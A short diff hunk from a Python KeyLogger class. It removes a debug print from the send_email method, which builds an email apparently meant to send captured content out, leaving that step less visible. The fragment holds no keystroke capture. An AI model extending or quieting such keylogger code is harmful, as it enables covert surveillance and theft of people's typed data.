@@ -134,7 +134,6 @@ class KeyLogger:
 
     def send_email(self, content):
         try:
-            print("Preparing email...")  
             msg = EmailMessage()
             msg['From'] = self.email
             msg['To'] = self.email
